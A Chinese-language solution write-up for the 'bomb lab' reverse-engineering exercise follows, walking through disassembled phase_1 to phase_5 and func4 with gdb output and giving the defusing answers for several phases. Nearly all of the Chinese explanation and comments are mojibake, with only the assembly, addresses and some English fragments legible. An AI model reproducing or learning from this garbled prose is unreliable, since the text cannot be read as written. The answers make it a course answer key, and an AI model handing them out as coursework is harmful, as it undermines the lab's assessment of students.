æ³¨æ„ï¼šæœ¬äººæ‰€å†™çš„æ³¨é‡Šå¯èƒ½æœ‰äº›é”™è¯¯ï¼Œæœ‰é—®é¢˜è¿˜è¯·å¤§å®¶æ‰¹è¯„æŒ‡æ­£ï¼Œæ³¨é‡Šä¸­*çš„ç”¨æ³•å’ŒCè¯­è¨€ç±»ä¼¼ï¼Œæœ‰äº›å¯„å­˜å™¨åç§°æ²¡æœ‰å¸¦%\né¢˜ç›®åªç»™äº†ä¸€ä¸ªmainå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¤§è‡´çœ‹å‡ºæ¥ï¼Œå®ƒçš„æ¨¡å¼æ˜¯ä»æŸä¸ªåœ°æ–¹è¯»å–å­—ç¬¦ä¸²ï¼Œç„¶åä½œä¸ºå‚æ•°è¾“å…¥æ¯ä¸ªå…³å¡phase_ï¼Œè¿›è¡ŒéªŒè¯ã€‚å…·ä½“çš„æƒ…å†µæ²¡æœ‰æ˜¾ç¤ºï¼Œè¯´æ˜æˆ‘ä»¬éœ€è¦é€šè¿‡æŸç§æ‰‹æ®µå»è¿›è¡Œæ¢æŸ¥ï¼š\nobjdump -d bomb \u0026gt; bomb.s åŒæ—¶çœ‹åˆ°bomb.cä¸­ï¼š\n/* When run with no arguments, the bomb reads its input lines * from standard input. */ if (argc == 1) { infile = stdin; } è¯´æ˜å¯ä»¥é€šè¿‡æ–‡ä»¶è¯»å–çš„æ–¹å¼è¿›è¡Œè¯»å–ã€‚\nå¯„å­˜å™¨è¯´æ˜ï¼š\nPhase_1 å…³é”®ä»£ç \n0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp //å°†æ ˆæŒ‡é’ˆå‡å°‘8ï¼Œä¹Ÿå°±æ˜¯å…¥æ ˆ 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; /*testæŒ‡ä»¤åŒé€»è¾‘ä¸andè¿ç®—ï¼Œä½†åªè®¾ç½®æ¡ä»¶ç å¯„å­˜å™¨ï¼Œä¸æ”¹å˜ç›®çš„å¯„å­˜å™¨çš„å€¼ï¼Œtest %eax,%eaxç”¨äºæµ‹è¯•å¯„å­˜å™¨%eaxæ˜¯å¦ä¸ºç©ºï¼Œç”±äºå¯„å­˜å™¨%raxä¸€èˆ¬å­˜æ”¾å‡½æ•°çš„è¿”å›å€¼ï¼Œæ­¤å¤„åº”è¯¥å­˜æ”¾çš„æ˜¯å‡½æ•° strings_not_equalçš„å€¼ï¼Œè€Œ%eaxæ˜¯%raxçš„ä½32ä½è¡¨ç¤ºï¼Œæ‰€ä»¥ä¸éš¾åˆ†æå‡ºï¼Œå½“%eaxå€¼ä¸º0æ—¶ï¼Œtestçš„ä¸¤ä¸ªæ“ä½œæ•°ç›¸åŒä¸”éƒ½ä¸º0ï¼Œæ¡ä»¶ç ZFç½®ä½ä¸º1ï¼Œå³å¯æ»¡è¶³ä¸‹ä¸€è¡Œä»£ç çš„è·³è½¬æŒ‡ä»¤*/ 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; //å½“ZFä½ä¸º0æ—¶ï¼Œè·³è½¬åˆ°400ef7å¤„ 400ef2:\te8 43 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //è°ƒç”¨explode-bombå‡½æ•°ï¼Œçˆ†ç‚¸ 400ef7:\t48 83 c4 08 add $0x8,%rsp //å‡ºæ ˆ 400efb:\tc3 ret ä»…ä»å‡½æ•°è°ƒç”¨çš„è§’åº¦æ¥çœ‹ï¼Œphase_1çš„å‚æ•°å­˜åœ¨1st argumentå¯„å­˜å™¨ä¸­ï¼š%rdiï¼Œç„¶åè¿™ä¸ªå‚æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸0x402400ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¸€èµ·è¢«ä¼ å…¥åˆ°strings_not_equalä¸­ï¼Œè¿›è¡Œä¸€äº›åˆ¤å®šæ“ä½œã€‚\n0x402400åƒä¸€ä¸ªåœ°å€ï¼Œä½¿ç”¨gdbå¯¹ç¨‹åºè¿›è¡Œdebugï¼Œè®¾ç½®æ–­ç‚¹æŸ¥çœ‹0x402400çš„å€¼ï¼Œå‘ç°æ˜¯Border relations with Canada have never been better.ï¼Œç­”æ¡ˆå·²æ‰¾åˆ°\nPhase_2 å…³é”®ä»£ç å¦‚ä¸‹ï¼š\n0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp //å…¥æ ˆï¼Œæ ˆæŒ‡é’ˆå‡å°‘40 400f02:\t48 89 e6 mov %rsp,%rsi //å°†%rspèµ‹ç»™%rsi(ç¬¬äºŒä¸ªå‚æ•°å¯„å­˜å™¨) 400f05:\te8 52 05 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) //å°†(%rsp)ä¸1æ¯”è¾ƒ 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; //è‹¥ç›¸ç­‰ï¼Œåˆ™è·³è½¬åˆ°0x400f30 400f10:\te8 25 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //è‹¥ä¸ç›¸ç­‰ï¼Œåˆ™çˆ†ç‚¸ 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax //(%rbx-4)å–å€¼åèµ‹ç»™eaxå¯„å­˜å™¨ 400f1a:\t01 c0 add %eax,%eax //eax=eax+eax 400f1c:\t39 03 cmp %eax,(%rbx) //æ¯”è¾ƒ%eaxå’Œ(%rbx)çš„å€¼ 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; //å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ°0x400f25 400f20:\te8 15 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦‚æœä¸ç›¸ç­‰ï¼Œå°±çˆ†ç‚¸ 400f25:\t48 83 c3 04 add $0x4,%rbx //rbxå¯„å­˜å™¨+4 400f29:\t48 39 eb cmp %rbp,%rbx //%rbxä¸%rbpæ¯”è¾ƒ 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; //å¦‚æœä¸ç›¸ç­‰ï¼Œè·³è½¬åˆ°0x400f17 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; //è·³è½¬åˆ°400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx //(%rsp+4)åèµ‹å€¼ç»™%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp //(%rsp+18)åå†èµ‹å€¼ç»™%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; //è·³è½¬åˆ°0x40f17 400f3c:\t48 83 c4 28 add $0x28,%rsp //å‡ºæ ˆï¼Œæ ˆæŒ‡é’ˆå¢åŠ 40 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 ret å¯ä»¥çœ‹å‡ºè¿™ä¸ªé˜¶æ®µè¯»å–å…­ä¸ªæ•°å­—ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªå¾ªç¯å°†å…¶ä¸å¯¹åº”çš„å€¼å¯¹æ¯”ï¼Œè¿™äº›å¯¹åº”å€¼çš„è§„å¾‹å°±æ˜¯1 2 4 8 16 32ï¼Œç­”æ¡ˆå·²å‡ºã€‚\nï¼ˆlea 0x18(%rsp),%rbpæŒ‡ä»¤æ˜¯å°†%rsp+40ä¼ ç»™%rbpï¼ŒleaæŒ‡ä»¤ç”¨äºè®¡ç®—æœ‰æ•ˆåœ°å€ï¼Œä»¥åŠåŠ æ³•å’Œæœ‰é™çš„ä¹˜æ³•è¿ç®—ï¼Œè€Œå…¶ä½™å¦‚mov -0x4(%rbx),%eaxåˆ™æ˜¯å–(%rbx-4)çš„å€¼å†ä¼ ç»™%eaxï¼‰\nPhase_3 å…³é”®ä»£ç å¦‚ä¸‹ï¼š\n0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp //å…¥æ ˆï¼Œæ ˆæŒ‡é’ˆå‡å°‘24 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //%rsp+12èµ‹ç»™%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //%rsp+8èµ‹ç»™%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi //å°†0x4025cfèµ‹ç»™%esi ç¬¬äºŒä¸ªå‚æ•°å¯„å­˜å™¨ 400f56:\tb8 00 00 00 00 mov $0x0,%eax //å°†0x0èµ‹ç»™%eax 400f5b:\te8 90 fc ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; //è°ƒç”¨scanfè¾“å…¥å‡½æ•° 400f60:\t83 f8 01 cmp $0x1,%eax //æ¯”è¾ƒè¿”å›å€¼å’Œ0x1çš„å¤§å°,sscanfçš„è¿”å›å€¼æ˜¯æˆåŠŸè§£æå’Œå­˜å‚¨çš„å‚æ•°æ•°ç›®ã€‚ 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; //å¦‚æœå¤§äºåˆ™è·³è½¬åˆ°0x400f6a 400f65:\te8 d0 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) //æ¯”è¾ƒ0x7å’Œ(%rsp+8)å€¼çš„å¤§å° 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; //å¦‚æœ (%rsp+8)\u0026gt;7 è·³è½¬åˆ°0x400fadå³çˆ†ç‚¸ 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax //å½“(%rsp+8)\u0026lt;=7æ—¶ï¼Œå°†(%rsp+8)çš„å€¼æ”¾å…¥%eaxä¸­ 400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) //è·³è½¬åˆ°å­˜æ”¾åœ¨%rax*8+0x402470å†…å­˜ä½ç½®ä¸Šçš„æŒ‡ä»¤ï¼Œå³%eax*8+0x402470 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax //å°†0xcfèµ‹ç»™%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; //è·³è½¬åˆ°0x400fbe 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax //æ¯”è¾ƒ(%rsp+12)å’Œ%eaxçš„å€¼ 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; //å¦‚æœç›¸ç­‰ï¼Œåˆ™è·³è½¬åˆ°0x400fc9 400fc4:\te8 71 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦‚æœä¸ç›¸ç­‰ï¼Œå°±çˆ†ç‚¸ 400fc9:\t48 83 c4 18 add $0x18,%rsp //å‡ºæ ˆï¼Œæ ˆæŒ‡é’ˆå¢åŠ 24 400fcd:\tc3 ret æ³¨æ„ï¼šjgæŒ‡ä»¤æ˜¯åé¢çš„æ“ä½œæ•°å¤§äºå‰é¢çš„æ“ä½œæ•°ï¼Œä¸è¦å¼„åäº†\né¦–å…ˆæ ¹æ®sscanfå‡½æ•°ç¡®å®šæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆšå¥½%rsp+8å’Œ%rsp+12æ²¡æœ‰èµ‹å€¼ï¼Œäºæ˜¯æ¨æµ‹è¿™ä¸¤ä¸ªå€¼å¯¹åº”è¿™ä¸¤ä¸ªå˜é‡ï¼Œæ¥ç€ç”±äºsscanfå‡½æ•°è¿”å›å‚æ•°çš„æ•°ç›®ï¼Œæ‰€ä»¥å¿…é¡»è¾“å…¥ä¸¤ä¸ªæ•°ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°è¦å°äºç­‰äº7ï¼Œæœ€åæ ¹æ®ä¸‹é¢è¿™æ¡å…³é”®æŒ‡ä»¤åˆ¤æ–­ç¬¬äºŒä¸ªå‚æ•°å–å†³äºç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼ï¼Œä½¿ç”¨gdbéå†æ‰“å°ç›¸åº”çš„è·³è½¬åœ°å€çš„å€¼ï¼Œå¾—åˆ°ä»¥ä¸‹åˆ—è¡¨ã€‚\næœ€å…³é”®çš„æŒ‡ä»¤æ˜¯ï¼š\n400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8)\n(gdb) x/ *0x402470 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º0ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0xcf 0x400f7c \u0026lt;phase_3+57\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/s *0x402478 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º1ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0x137 311 0x400fb9 \u0026lt;phase_3+118\u0026gt;: \u0026#34;\\270\\067\\001\u0026#34; (gdb) x/ *0x402480 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º2ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0x2c3 0x400f83 \u0026lt;phase_3+64\u0026gt;: \u0026#34;\\270\\303\\002\u0026#34; (gdb) x/ *0x402488 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º3ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0x100 0x400f8a \u0026lt;phase_3+71\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x402490 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º4ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0x185 0x400f91 \u0026lt;phase_3+78\u0026gt;: \u0026#34;\\270\\205\\001\u0026#34; (gdb) x/ *0x402498 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º5ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0xce 0x400f98 \u0026lt;phase_3+85\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x4024a0 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º6ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0x2aa 0x400f9f \u0026lt;phase_3+92\u0026gt;: \u0026#34;\\270\\252\\002\u0026#34; (gdb) x/ *0x4024a8 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º7ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0x147 0x400fa6 \u0026lt;phase_3+99\u0026gt;: \u0026#34;\\270G\\001\u0026#34; Phase_4 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp //å…¥æ ˆï¼Œæ ˆæŒ‡é’ˆå‡å°‘18 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //rcx=rsp+12 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //rdx=rsp+8 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi //esi=0x4025cf 40101f:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 401024:\te8 c7 fb ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax //æ¯”è¾ƒeaxå’Œ2 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; //å¦‚æœä¸ç›¸ç­‰ï¼Œè·³è½¬åˆ°0x401035å³çˆ†ç‚¸ 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) //ç›¸ç­‰åˆ™æ¯”è¾ƒ(%rsp+8)çš„å†…å­˜å€¼å’Œ14 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; //å¦‚æœ(%rsp+8)\u0026lt;=14,è·³è½¬åˆ°0x40103a 401035:\te8 00 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 40103a:\tba 0e 00 00 00 mov $0xe,%edx //edx=14 å‚æ•°3 40103f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 å‚æ•°2 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi //edi=*(rsp+8) å‚æ•°1 401048:\te8 81 ff ff ff call 400fce \u0026lt;func4\u0026gt; //è°ƒç”¨func4å‡½æ•° 40104d:\t85 c0 test %eax,%eax //åˆ¤æ–­è¿”å›å€¼æ˜¯å¦ä¸º0 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; //å¦‚æœä¸ç­‰äº0ï¼Œè·³è½¬åˆ°401058å³çˆ†ç‚¸ 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) //æ¯”è¾ƒ*(rsp+12)å’Œ0 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; //å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ°40105d 401058:\te8 dd 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp //å‡ºæ ˆ 401061:\tc3 ret å¾ˆæ˜æ˜¾è¦é€šè¿‡æ­¤å…³å¿…é¡»åœ¨è°ƒç”¨func4åè¿”å›0ï¼Œè€Œä¸”ç¬¬äºŒä¸ªå‚æ•°è¦ç­‰äº0ï¼Œæ‰€ä»¥åªéœ€é€šè¿‡è°ƒæ•´ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼æ¥ä½¿å¾—func4å‡½æ•°è¿”å›0\n0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp //å…¥æ ˆ 400fd2:\t89 d0 mov %edx,%eax //eax=edx=14 rsi=0 edi=ç¬¬ä¸€ä¸ªå‚æ•° 400fd4:\t29 f0 sub %esi,%eax //eax=eax-esi=14 400fd6:\t89 c1 mov %eax,%ecx //ecx=eax=14 400fd8:\tc1 e9 1f shr $0x1f,%ecx //ecxé€»è¾‘å³ç§»31ä½ ecx=0 400fdb:\t01 c8 add %ecx,%eax //eax=eax+ecx=14 400fdd:\td1 f8 sar %eax //eaxç®—æ•°å³ç§»ä¸€ä½ eax=7 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx //ecx=rsi+rax=7 400fe2:\t39 f9 cmp %edi,%ecx //æ¯”è¾ƒediå’Œecx=7 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; //è‹¥edi\u0026gt;=ecx è·³è½¬åˆ°0x400ff2 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx //å¦åˆ™ï¼Œedx=rcx-1=6 400fe9:\te8 e0 ff ff ff call 400fce \u0026lt;func4\u0026gt; //è°ƒç”¨func4å‡½æ•° edi esi=0 edx=13 400fee:\t01 c0 add %eax,%eax //eax=eax*2 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; è·³è½¬åˆ°0x401007 400ff2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 400ff7:\t39 f9 cmp %edi,%ecx //æ¯”è¾ƒediå’Œecx=7 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; //è‹¥ecx\u0026gt;=edi è·³è½¬åˆ°0x401007 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi //è‹¥ecx\u0026lt;ediï¼Œesi=rcx+1=8 400ffe:\te8 cb ff ff ff call 400fce \u0026lt;func4\u0026gt; //è°ƒç”¨func4å‡½æ•° edi esi=8 edx=14 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax //eax=rax+rax+1 ä¸èƒ½ç»è¿‡è¿™æ¡æŒ‡ä»¤ï¼Œediå¿…é¡»å°äºç­‰äº7 401007:\t48 83 c4 08 add $0x8,%rsp //å‡ºæ ˆ 40100b:\tc3 ret é¦–å…ˆediå¯„å­˜å™¨ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»å°äºç­‰äº7ï¼Œ\nlea 0x1(%rax,%rax,1),%eaxè¿™æ¡æŒ‡ä»¤ä¸èƒ½æ‰§è¡Œï¼Œä¸€æ—¦æ‰§è¡Œè¿™æ¡æ‰§è¡Œï¼Œé‚£ä¹ˆeaxå¯„å­˜å™¨å°±ä¸å¯èƒ½ç­‰äº0ï¼ŒåŒæ—¶æˆ‘ä»¬è§‚å¯Ÿåˆ°ä¸¤ä¸ªåˆ¤æ–­è¯­å¥éƒ½æœ‰ç­‰äºæ¡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬æŠŠç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸º7ï¼Œå¾ˆé¡ºåˆ©åœ°ä½¿eaxå¯„å­˜å™¨ç­‰äº0ï¼Œå½“ç„¶è¿˜æœ‰å…¶å®ƒçš„å¯èƒ½æ€§ï¼Œå¯ä»¥ä¸€ä¸€å»è¯•ã€‚\n7 0 | Phase_5 0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx //ä¿å­˜è°ƒç”¨è€…å¯„å­˜å™¨ 401063:\t48 83 ec 20 sub $0x20,%rsp //å…¥æ ˆï¼Œæ ˆæŒ‡é’ˆå‡å°‘32 401067:\t48 89 fb mov %rdi,%rbx //rbx=rdi ç¬¬ä¸€ä¸ªå‚æ•° 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax //å°† %fs æ®µå¯„å­˜å™¨ä¸­åç§»åœ°å€ä¸º 0x28 çš„å†…å®¹åŠ è½½åˆ° %rax å¯„å­˜å™¨ä¸­ã€‚ 401071:\t00 00 //%fs æ˜¯ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼Œé€šå¸¸ç”¨äºè®¿é—®çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆThread Local Storage, TLSï¼‰ 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) //å°†å…¶æ”¾åœ¨æ ˆä¸Š *(rsp+24)=rax 401078:\t31 c0 xor %eax,%eax // eax=0 40107a:\te8 9c 02 00 00 call 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax //å­—ç¬¦ä¸²çš„é•¿åº¦ä¸6æ¯”è¾ƒ 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; //è‹¥å­—ç¬¦ä¸²çš„é•¿åº¦ç­‰äº6ï¼Œè·³è½¬åˆ°0x4010d2 401084:\te8 b1 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //ä»(rax+rbx)å¤„è¯»å–çš„1å­—èŠ‚æ•°æ®é›¶æ‰©å±•åˆ°ecxä¸­ ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //å°†clçš„å€¼å­˜å…¥rspæ‰€æŒ‡çš„åœ°å€ä¸­(rcxçš„ä½8ä½) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //ä»(rdx+0x4024b0)å¤„è¯»å–çš„1å­—èŠ‚æ•°æ®é›¶æ‰©å±•åˆ°edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //å°†dl(edxçš„ä½8ä½)å­˜å…¥((rax+rsp)+16)åœ°å€ä¸­ *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //æ¯”è¾ƒraxå’Œ6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //è‹¥rax!=6ï¼Œåˆ™è·³è½¬åˆ°0x40108b è¿™éƒ¨åˆ†çš„å¾ªç¯ç›¸å½“äºä»¥ä¸‹Cç¨‹åºï¼š for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } *(rsp+16)=0xb9 *(rsp+17)=0xbf *(rsp+18)=0xbe *(rsp+19)=0xb5 *(rsp+20)=0xb6 *(rsp+21)=0xb7 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) //å¦åˆ™ï¼Œå°†å­—èŠ‚0x0å­˜å…¥(rsp+22)åœ°å€ä¸­ 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi //esi=0x40245e 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi //rdi=rsp+16 *(rsp+16)=0xbb 4010bd:\te8 76 02 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax //åˆ¤æ–­è¿”å›å€¼æ˜¯å¦ä¸º0 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; //è¿”å›å€¼ä¸º0ï¼Œåˆ™è·³è½¬åˆ°0x4010d9 4010c6:\te8 6f 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; //è·³è½¬åˆ°0x40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax //rax=*(rsp+24) 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax //raxä¸%fsæ®µå¯„å­˜å™¨ä¸­åç§»åœ°å€ä¸º0x28çš„å†…å®¹å¼‚æˆ–æ¥æ£€æŸ¥å†…å®¹æ˜¯å¦è¢«ä¿®æ”¹ 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; //å¦‚æœç›¸ç­‰ï¼Œåˆ™è·³è½¬åˆ°0x4010ee 4010e9:\te8 42 fa ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; //å¦åˆ™è°ƒç”¨é”™è¯¯å¤„ç†å†ç¨‹ 4010ee:\t48 83 c4 20 add $0x20,%rsp //å‡ºæ ˆï¼Œæ ˆæŒ‡é’ˆå¢åŠ 32 4010f2:\t5b pop %rbx 4010f3:\tc3 ret å…³é”®ä»£ç ï¼š\n40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //ä»(rax+rbx)å¤„è¯»å–çš„1å­—èŠ‚æ•°æ®é›¶æ‰©å±•åˆ°ecxä¸­ ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //å°†clçš„å€¼å­˜å…¥rspæ‰€æŒ‡çš„åœ°å€ä¸­(rcxçš„ä½8ä½) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //ä»(rdx+0x4024b0)å¤„è¯»å–çš„1å­—èŠ‚æ•°æ®é›¶æ‰©å±•åˆ°edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //å°†dl(edxçš„ä½8ä½)å­˜å…¥((rax+rsp)+16)åœ°å€ä¸­ *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //æ¯”è¾ƒraxå’Œ6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //è‹¥rax!=6ï¼Œåˆ™è·³è½¬åˆ°0x40108b è¿™éƒ¨åˆ†çš„å¾ªç¯ç›¸å½“äºä»¥ä¸‹Cç¨‹åºï¼š for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } 